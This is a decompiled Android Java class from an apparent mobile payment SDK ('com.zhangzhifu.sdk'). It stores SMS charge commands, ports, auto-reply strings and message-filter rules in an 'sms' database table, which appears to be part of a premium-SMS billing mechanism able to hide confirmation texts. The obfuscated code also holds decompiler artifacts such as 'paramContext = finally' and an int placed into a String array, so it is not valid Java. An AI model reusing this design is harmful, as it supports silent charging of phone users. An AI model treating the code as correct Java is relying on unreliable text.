package com.zhangzhifu.sdk.a;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import com.zhangzhifu.sdk.b.l;
import java.util.LinkedList;
import java.util.List;

public class d
{
  private static d a;
  
  private d() {}
  
  public static d a()
  {
    if (a == null) {
      a = new d();
    }
    return a;
  }
  
  public List a(Context paramContext)
  {
    try
    {
      LinkedList localLinkedList = new LinkedList();
      paramContext = f.a(paramContext).getReadableDatabase();
      Object localObject = new StringBuffer();
      ((StringBuffer)localObject).append(" select charge_count , cmd , is_second , port , reply_content , reply_end_str , reply_start_str , second_port , second_type , sms_delay_time , _ID , filter_info , filter_port , second_info , is_sms , is_fuzzy").append(" from sms");
      localObject = paramContext.rawQuery(((StringBuffer)localObject).toString(), null);
      ((Cursor)localObject).moveToFirst();
      if (((Cursor)localObject).getCount() > 0) {
        do
        {
          l localL = new l();
          localL.d(((Cursor)localObject).getInt(0));
          localL.d(((Cursor)localObject).getString(1));
          localL.b(((Cursor)localObject).getInt(2));
          localL.e(((Cursor)localObject).getString(3));
          localL.i(((Cursor)localObject).getString(4));
          localL.h(((Cursor)localObject).getString(5));
          localL.g(((Cursor)localObject).getString(6));
          localL.f(((Cursor)localObject).getString(7));
          localL.c(((Cursor)localObject).getInt(8));
          localL.e(((Cursor)localObject).getInt(9));
          localL.a(((Cursor)localObject).getInt(10));
          localL.c(((Cursor)localObject).getString(11));
          localL.b(((Cursor)localObject).getString(12));
          localL.j(((Cursor)localObject).getString(13));
          localL.a(Boolean.parseBoolean(((Cursor)localObject).getString(14)));
          localL.f(((Cursor)localObject).getInt(15));
          localLinkedList.add(localL);
        } while (((Cursor)localObject).moveToNext());
      }
      ((Cursor)localObject).close();
      paramContext.close();
      return localLinkedList;
    }
    finally {}
  }
  
  public void a(Context paramContext, int paramInt)
  {
    try
    {
      paramContext = f.a(paramContext).getWritableDatabase();
      paramContext.delete("sms", "_ID = ?", new String[] { paramInt });
      paramContext.close();
      return;
    }
    finally
    {
      paramContext = finally;
      throw paramContext;
    }
  }
  
  public void a(Context paramContext, l paramL)
  {
    try
    {
      paramContext = f.a(paramContext).getWritableDatabase();
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("charge_count", Integer.valueOf(paramL.m()));
      paramContext.update("sms", localContentValues, "_ID = ? ", new String[] { paramL.c() });
      paramContext.close();
      return;
    }
    finally
    {
      paramContext = finally;
      throw paramContext;
    }
  }
  
  public void a(l paramL, Context paramContext)
  {
    try
    {
      paramContext = f.a(paramContext).getWritableDatabase();
      ContentValues localContentValues = new ContentValues();
      localContentValues.put("charge_count", Integer.valueOf(paramL.m()));
      localContentValues.put("cmd", paramL.e());
      localContentValues.put("is_second", Integer.valueOf(paramL.g()));
      localContentValues.put("port", paramL.f());
      localContentValues.put("reply_content", paramL.l());
      localContentValues.put("reply_end_str", paramL.k());
      localContentValues.put("reply_start_str", paramL.j());
      localContentValues.put("second_port", paramL.i());
      localContentValues.put("second_info", paramL.o());
      localContentValues.put("second_type", Integer.valueOf(paramL.h()));
      localContentValues.put("sms_delay_time", Integer.valueOf(paramL.n()));
      localContentValues.put("filter_info", paramL.b());
      localContentValues.put("filter_port", paramL.a());
      localContentValues.put("is_sms", Boolean.valueOf(paramL.d()));
      localContentValues.put("is_fuzzy", Integer.valueOf(paramL.p()));
      paramContext.insert("sms", null, localContentValues);
      paramContext.close();
      return;
    }
    finally
    {
      paramL = finally;
      throw paramL;
    }
  }
  
  public void b(Context paramContext)
  {
    try
    {
      paramContext = f.a(paramContext).getWritableDatabase();
      paramContext.delete("sms", null, null);
      paramContext.close();
      return;
    }
    finally
    {
      paramContext = finally;
      throw paramContext;
    }
  }
}
